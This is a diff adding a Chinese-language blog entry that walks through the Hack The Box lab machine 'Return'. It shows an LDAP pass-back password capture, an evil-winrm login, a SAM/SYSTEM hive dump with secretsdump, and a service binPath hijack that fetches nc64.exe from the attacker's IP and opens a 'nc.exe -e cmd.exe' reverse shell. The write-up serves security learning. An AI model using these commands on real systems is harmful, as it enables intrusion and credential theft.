@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>HTB-Return</title>
+    <link href="/2025/02/11/HTB-Return/"/>
+    <url>/2025/02/11/HTB-Return/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Return"><a href="#Return" class="headerlink" title="Return"></a>Return</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502111942468.png" alt="image-20250211194200222"></p><p>访问80端口 是一个打印机。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112155935.png" alt="image-20250211215542805"></p><p>这个地方可以利用ldap回传攻击 将ip改成自己的vpn的ip 然后端口不变，进行一个监听</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112156972.png" alt="image-20250211215640843"></p><p>得到密码 1edFg43012!!</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上面的5985端口开启 可以试试winrm登录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.108</span> -u <span class="hljs-string">&quot;svc-printer&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112211006.png" alt="image-20250211221144819"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>whoami /priv看一下</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112217730.png" alt="image-20250211221716542"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">尝试 利用SeRestorePrivilege和SeShutdownPrivilege进行提权<br><br>reg save hklm\system C:\Users\svc-printer\Documents\ssytem.hive<br>reg save hklm\sam C:\Users\svc-printer\Documents\sam.hive<br><br>download C:\Users\svc-printer\Documents\ssytem.hive <span class="hljs-regexp">/root/</span>HTB/ssytem.hive<br>download C:\Users\svc-printer\Documents\sam.hive    <span class="hljs-regexp">/root/</span>HTB/sam.hive<br><br>python3 secretsdump.py -sam <span class="hljs-regexp">/root/</span>HTB<span class="hljs-regexp">/sam.hive -system /</span>root<span class="hljs-regexp">/HTB/</span>system.hive  LOCAL <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502112323761.png" alt="image-20250211232358621"></p><p>得到administrator的哈希 然后利用这个登录上去。但是这里我登录不上去 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120006073.png" alt="image-20250212000628001"></p><p>net user svc-printer 看一下所属组的权限</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120014739.png" alt="image-20250212001427558"></p><p>参考链接：<a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</a></p><p>主要是Server Operators </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120037393.png" alt="image-20250212003756295"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">powershell -<span class="hljs-keyword">c</span> wget <span class="hljs-string">&#x27;http://10.10.14.21:8000/nc64.exe&#x27;</span> -outfile <span class="hljs-string">&#x27;nc.exe&#x27;</span><br>sc.<span class="hljs-keyword">exe</span> config VMTools binPath=<span class="hljs-string">&quot;C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.21 1234&quot;</span><br>sc.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">stop</span> VMTools<br>sc.<span class="hljs-keyword">exe</span> start VMTools<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120104222.png" alt="image-20250212010409981"></p><p>原先的服务被替换掉了 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202502120111571.png" alt="image-20250212011121253"></p><p>提权成功。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Windows靶机初级</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>HTB</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>HTB-Heal</title>
     <link href="/2025/02/07/HTB-Heal/"/>
     <url>/2025/02/07/HTB-Heal/</url>
